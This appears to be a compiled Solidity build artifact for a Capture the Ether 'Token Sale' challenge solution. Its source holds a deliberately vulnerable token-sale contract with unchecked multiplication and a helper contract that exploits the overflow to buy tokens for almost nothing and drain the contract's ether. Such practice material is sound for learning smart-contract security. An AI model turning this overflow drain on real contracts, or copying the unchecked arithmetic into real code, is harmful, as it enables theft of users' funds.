{
  "contractName": "TokenSaleHelper",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "getOtherContract",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "newAddr",
          "type": "address"
        }
      ],
      "name": "setOtherContract",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "otherContract",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "name": "tokens",
          "type": "uint256"
        },
        {
          "indexed": false,
          "name": "price",
          "type": "uint256"
        },
        {
          "indexed": false,
          "name": "result",
          "type": "uint256"
        }
      ],
      "name": "TestTokens",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "name": "caller",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "newAddress",
          "type": "address"
        }
      ],
      "name": "SetOtherContract",
      "type": "event"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "buy",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x606060405260008060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550341561005057600080fd5b6104ac8061005f6000396000f30060606040526004361061006d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680630b4b51981461006f57806335a28f3e146100c45780633ccfd60b146100fd578063a6f2ae3a14610112578063e98d36e11461011c575b005b341561007a57600080fd5b610082610171565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34156100cf57600080fd5b6100fb600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190505061019a565b005b341561010857600080fd5b610110610274565b005b61011a6102cd565b005b341561012757600080fd5b61012f61045b565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055507f081eb3239ea805b9a08e7c4f93baacc9d1965ecde599e5ed9b2b3936cd3fe0b83382604051808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019250505060405180910390a150565b3373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f1935050505015156102cb57600080fd5b565b6000806000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff161415151561031557600080fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff1663d96a094a6705c5e699574800007812725dd1d243aba0e75fe645cc4873f9e65afe688c928e1f226040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808281526020019150506000604051808303818588803b15156103c857600080fd5b5af115156103d557600080fd5b505050508073ffffffffffffffffffffffffffffffffffffffff1663e4849b3260016040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b151561044857600080fd5b5af1151561045557600080fd5b50505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff16815600a165627a7a72305820016575d55c8e87decf4cf842f2685c5a2c59c2ad8fa20824aae0e2c5f74aca890029",
  "source": "pragma solidity ^0.4.21;\r\n\r\nimport './OtherContract.sol';\r\n\r\ncontract TokenSaleHelper is OtherContract {\r\n    event TestTokens(uint256 tokens, uint256 price, uint256 result);\r\n\r\n    function buy() public payable {\r\n        require(otherContract != 0);\r\n        TokenSaleChallenge tokenSaleChallenge = TokenSaleChallenge(otherContract);\r\n        tokenSaleChallenge.buy.value(415992086870360064)(115792089237316195423570985008687907853269984665640564039458);\r\n        tokenSaleChallenge.sell(1);\r\n    }\r\n\r\n    function withdraw() public {\r\n        msg.sender.transfer(address(this).balance);\r\n    }\r\n\r\n    function() public payable { \r\n    }\r\n}\r\n\r\ncontract TokenSaleChallenge {\r\n    mapping(address => uint256) public balanceOf;\r\n    uint256 constant PRICE_PER_TOKEN = 1 ether;\r\n\r\n    function TokenSaleChallenge(address /*_player*/) public payable {\r\n        require(msg.value == 1 ether);\r\n    }\r\n\r\n    function isComplete() public view returns (bool) {\r\n        return address(this).balance < 1 ether;\r\n    }\r\n\r\n    function buy(uint256 numTokens) public payable {\r\n        require(msg.value == numTokens * PRICE_PER_TOKEN);\r\n\r\n        balanceOf[msg.sender] += numTokens;\r\n    }\r\n\r\n    function sell(uint256 numTokens) public {\r\n        require(balanceOf[msg.sender] >= numTokens);\r\n\r\n        balanceOf[msg.sender] -= numTokens;\r\n        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);\r\n    }\r\n}",
  "sourcePath": "C:\\defi\\capturetheether\\contracts\\TokenSaleChallenge.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.21+commit.dfe3193c.Emscripten.clang"
  },
  "schemaVersion": "3.4.3",
  "updatedAt": "2021-11-13T20:59:44.094Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}